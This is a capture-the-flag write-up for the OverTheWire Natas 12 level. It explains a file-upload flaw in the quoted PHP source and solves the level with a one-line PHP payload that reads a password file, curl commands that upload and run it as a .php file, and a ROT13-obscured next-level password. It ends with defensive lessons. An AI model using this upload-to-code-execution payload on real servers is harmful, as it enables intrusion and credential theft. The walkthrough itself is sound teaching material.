# Write-up: Natas 12 → 13  
**Date:** 2025-12-12  

## Obfuscated password (ROT13)  
`geof5cPwPexhFxaOOXUunOkd6Jz1w3YP`

---

## OBJECTIVE

> We’re given a file upload form. The goal is to upload a file that reveals the **next level's password**, bypassing file type validation and executing code on the server.
> Clicking “View sourcecode” shows:

    <?php

    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";

        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }

        return $string;
    }

    function makeRandomPath($dir, $ext) {
        do {
            $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }

    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }

    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else {
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>

---

## PURPOSE

This level teaches a foundational web exploit: **bypassing insecure file upload protections** to achieve **remote code execution (RCE)**. The form allows users to upload files with `.jpg` or `.jpeg` extensions. The server saves the uploaded file to an `/upload/` directory that is publicly accessible and executable, making it vulnerable if proper restrictions aren't in place.

First, the script calls `genRandomString()` to create a random 10-character alphanumeric string used to obfuscate the filename of the uploaded file. It then appends the extension derived from user input and ensures there is no name collision in the upload folder.

The extension is extracted from a user-supplied `filename` parameter (e.g., `shell.php`) and passed into `makeRandomPath()`. **This is the core vulnerability**. If the user submits `filename=shell.php`, the server will generate a path such as `upload/abcxyz1234.php`.

The logic flow is:
1) If a POST request includes `filename`, extract its extension and generate a target path.
2) Reject files larger than 1 KB.
3) Move the uploaded file to the generated path and echo a clickable link.

The server relies solely on a **user-controlled filename extension**. No server-side MIME or content validation is performed.

---

## SOLUTION

1. **Prepare a PHP payload disguised as an image**

   Create a file named `shell.php.jpg` with the following contents:

       <?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>

2. **Upload the file while controlling the final extension**

   Submit the upload while forcing the stored extension to `.php` via the `filename` field:

       curl -u natas12:<password> \
         -F "uploadedfile=@shell.php.jpg" \
         -F "filename=shell.php" \
         http://natas12.natas.labs.overthewire.org/

   The server responds with a randomized PHP filename, for example:

       upload/e6owy2jqem.php

3. **Execute the uploaded PHP file**

   Request the uploaded file with HTTP Basic Authentication:

       curl -u natas12:<password> \
       http://natas12.natas.labs.overthewire.org/upload/e6owy2jqem.php

4. **Result**

   The PHP code executes and prints the password for **Natas 13**.

---

## TAKEAWAYS

- Never rely on **file extension** alone for upload validation.
- Upload directories should have **script execution disabled**.
- User-supplied filenames must never influence stored extensions.
- Randomizing filenames is ineffective if the extension remains attacker-controlled.
- File validation must be enforced **server-side**, not via client hints.

---

Writeup author: **Jeremy Ray Jewell**  
GitHub: https://github.com/jeremyrayjewell  
LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
